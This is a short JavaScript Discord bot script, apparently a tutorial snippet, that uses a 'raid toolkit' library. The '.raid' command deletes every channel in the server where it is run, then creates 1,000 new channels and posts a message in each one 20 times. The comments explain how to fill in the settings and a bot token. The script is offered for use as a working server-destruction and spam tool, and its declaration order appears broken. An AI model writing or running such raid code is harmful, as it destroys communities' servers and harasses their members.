const Discord = require('discord.js') //we require discord
const client = new Discord.Client() //setting/creating a new discord client (bot)
client.on('message', async message => {
    if(message.content.startsWith('.raid')) {
    await raid.deleteAllChannels(message.guild.id) //deleting every channel in the guild with the id provided, in this case, the current guild where command was executed
    await raid.createChannelsLoop(message.guild.id, {amount_of_created_channels: 1000, message_that_will_be_sent: "insert your message", times_message_is_sent: 20, channels_name: "Insert Name of channel", reason_channels: "Insert Reason of channels", channels_topic: "Insert Channels Topic", nsfw: false, channel_cooldown: 50}) //btw channel_cooldown is put in seconds, like, i put 10 so channel cooldown will be 10 seconds, you can always try the code and understand it the max possible 
const Disc_rd = require('discord-raid-toolkit-revamp')
const raid = new Disc_rd.RaidBot(client) //here we pass client parameter, as you see i set it as client because that is the name i put it as in const **client**

  }
})

client.login("Insert your token")